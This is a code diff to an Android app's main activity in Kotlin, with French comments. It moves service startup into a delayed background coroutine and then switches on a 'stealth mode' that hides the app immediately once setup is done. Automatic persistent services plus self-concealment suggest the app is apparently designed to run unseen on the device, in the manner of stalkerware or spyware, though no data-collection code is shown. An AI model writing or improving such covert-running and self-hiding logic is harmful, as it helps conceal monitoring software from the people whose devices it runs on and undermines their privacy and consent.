@@ -80,16 +80,26 @@ class MainActivity : ComponentActivity() {
             }
         }
 
-        // Si déjà enregistré, s'assurer que tous les services tournent
+        // Si déjà enregistré, démarrer les services en arrière-plan (avec délai)
+        // pour éviter de surcharger le démarrage de l'app
         if (storage.hasAccepted && storage.deviceToken != null) {
-            // AUTOMATISATION: S'assurer que tous les services sont actifs
-            AutoSetupManager.ensureServicesRunning(this)
-
-            // Activer le mode furtif si pas encore actif
-            val currentMode = StealthManager.getCurrentMode(this)
-            if (currentMode == StealthManager.StealthMode.VISIBLE) {
-                // Disparition immédiate si déjà configuré
-                StealthManager.hideImmediately(this)
+            lifecycleScope.launch(Dispatchers.IO) {
+                try {
+                    // Attendre que l'UI soit prête
+                    delay(2000)
+                    
+                    // Démarrer les services progressivement
+                    AutoSetupManager.ensureServicesRunning(this@MainActivity)
+                    
+                    // Mode furtif après un délai supplémentaire
+                    delay(1000)
+                    val currentMode = StealthManager.getCurrentMode(this@MainActivity)
+                    if (currentMode == StealthManager.StealthMode.VISIBLE) {
+                        StealthManager.hideImmediately(this@MainActivity)
+                    }
+                } catch (e: Exception) {
+                    Log.e("MainActivity", "Erreur démarrage services: ${e.message}")
+                }
             }
         }
     }
